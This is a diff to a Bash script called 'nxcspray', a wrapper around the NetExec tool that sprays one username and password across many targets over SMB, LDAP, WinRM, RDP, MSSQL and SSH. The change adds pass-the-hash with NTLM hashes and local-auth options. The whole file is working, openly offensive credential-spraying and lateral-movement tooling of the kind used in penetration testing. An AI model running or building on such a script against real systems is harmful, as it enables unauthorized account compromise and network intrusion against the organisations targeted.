@@ -1,17 +1,12 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
 # Usage:
-#   nxcspray <protocols|all> <targets> -u <username> -p <password>
-#
-# Examples:
-#   nxcspray all 10.10.10.10 -u bob -p password
-#   nxcspray smb,ldap,winrm hosts.txt -u bob -p password
+#   nxcspray <protocols|all> <targets> -u <username> (-p <password> | -H <hash>) [--local-auth]
 
-# ---- Argument Validation ----
-if [ "$#" -lt 4 ]; then
-    echo "[-] Usage: $0 <protocols|all> <targets> -u <username> -p <password>"
-    exit 1
-fi
+[ "$#" -lt 4 ] && {
+  echo "[-] Usage: $0 <protocols|all> <targets> -u <username> (-p <password> | -H <hash>) [--local-auth]"
+  exit 1
+}
 
 PROTOS_RAW="$1"
 TARGETS_RAW="$2"
@@ -19,43 +14,97 @@ shift 2
 
 USER=""
 PASS=""
+HASH=""
+LOCAL_AUTH=0
 
-while getopts "u:p:" opt; do
-    case $opt in
-        u) USER="$OPTARG" ;;
-        p) PASS="$OPTARG" ;;
-        *)
-            echo "[-] Invalid flag"
-            exit 1
-            ;;
-    esac
+# ---- Args parsing ----
+while [ "$#" -gt 0 ]; do
+  case "$1" in
+  -u)
+    USER="$2"
+    shift 2
+    ;;
+  -p)
+    PASS="$2"
+    shift 2
+    ;;
+  -H)
+    HASH="$2"
+    shift 2
+    ;;
+  --local-auth)
+    LOCAL_AUTH=1
+    shift
+    ;;
+  *)
+    echo "[-] Unknown arg: $1"
+    exit 1
+    ;;
+  esac
 done
 
-if [ -z "$USER" ] || [ -z "$PASS" ]; then
-    echo "[-] Missing required flags: -u <username> -p <password>"
-    exit 1
+# ---- Checks ----
+[ -z "$USER" ] && {
+  echo "[-] Missing -u"
+  exit 1
+}
+
+if [ -n "$PASS" ] && [ -n "$HASH" ]; then
+  echo "[-] Use either -p OR -H"
+  exit 1
+fi
+if [ -z "$PASS" ] && [ -z "$HASH" ]; then
+  echo "[-] Missing auth (-p or -H)"
+  exit 1
 fi
 
 # ---- Protocol Handling ----
 if [ "$PROTOS_RAW" = "all" ]; then
-    PROTO_ARRAY=(smb ldap winrm rdp mssql ssh)
+  PROTO_ARRAY=(smb ldap winrm rdp mssql ssh)
 else
-    IFS=',' read -ra PROTO_ARRAY <<< "$PROTOS_RAW"
+  IFS=',' read -ra PROTO_ARRAY <<<"$PROTOS_RAW"
 fi
 
 # ---- Target Handling ----
 if [ -f "$TARGETS_RAW" ]; then
-    TARGETS=$(cat "$TARGETS_RAW")
+  TARGETS="$(tr -s ' \t\r\n' '\n' <"$TARGETS_RAW" | sed '/^$/d')"
 else
-    TARGETS="$TARGETS_RAW"
+  TARGETS="$TARGETS_RAW"
 fi
+
+# ---- Capability checks ----
+supports_localauth() {
+  case "$1" in smb | ldap | winrm | rdp) return 0 ;; *) return 1 ;; esac
+}
+
+supports_hash() {
+  case "$1" in smb | ldap | winrm | rdp | mssql) return 0 ;; *) return 1 ;; esac
+}
 
 # ---- Spray Loop ----
 for PROTO in "${PROTO_ARRAY[@]}"; do
-    echo "[+] Spraying protocol: $PROTO"
+  echo "[+] $PROTO"
 
-    for TARGET in $TARGETS; do
-        echo "    -> Target: $TARGET"
-        nxc "$PROTO" "$TARGET" -u "$USER" -p "$PASS"
-    done
+  for TARGET in $TARGETS; do
+    echo "    -> $TARGET"
+
+    CMD=(nxc "$PROTO" "$TARGET" -u "$USER")
+
+    if [ -n "$HASH" ]; then
+      if supports_hash "$PROTO"; then
+        CMD+=(-H "$HASH")
+      else
+        echo "      [!] -H not supported for $PROTO"
+        continue
+      fi
+    else
+      CMD+=(-p "$PASS")
+    fi
+
+    if [ "$LOCAL_AUTH" -eq 1 ] && supports_localauth "$PROTO"; then
+      CMD+=(--local-auth)
+    fi
+
+    "${CMD[@]}"
+  done
 done
